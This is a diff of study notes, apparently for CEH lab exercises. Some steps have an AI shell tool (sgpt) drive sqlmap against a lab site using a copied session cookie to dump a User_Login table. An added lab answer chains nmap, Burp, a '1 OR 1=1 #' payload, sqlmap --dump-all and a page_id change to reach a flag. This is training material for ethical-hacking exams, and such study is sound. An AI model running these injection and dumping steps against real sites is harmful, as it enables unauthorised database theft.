@@ -55,7 +55,11 @@ SQL injection is a technique used to take advantage of un-sanitized input vulner
 1. `` **sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and enumerate the DBMS databases"** ``
 2. ``sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and enumerate the tables pertaining to moviescope database"``
 3. ``sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and retrieve User_Login table contents from moviescope database"```
+## 
 
+.Exploit the web application available at www.cehorg.com and enter the flag's value at the page with page_id=84. Answer: 
+1. nmap -sV --script=http-enum [target domain or IP address]
+2. Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap. 3. Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT” you get some value on burp copy that and create the txt file.(1 OR 1=1 #) 4. sqlmap -r <txt file from burpsuite> --dbs  5. sqlmap -r <txt file from burpsuite> -D <database name> --tables 6. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --columns 7. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --dump-all 8. then login and do the url parameter change page_id=1 to page_id=84 
 
 - [ ]  make notes for using AI sql  
       
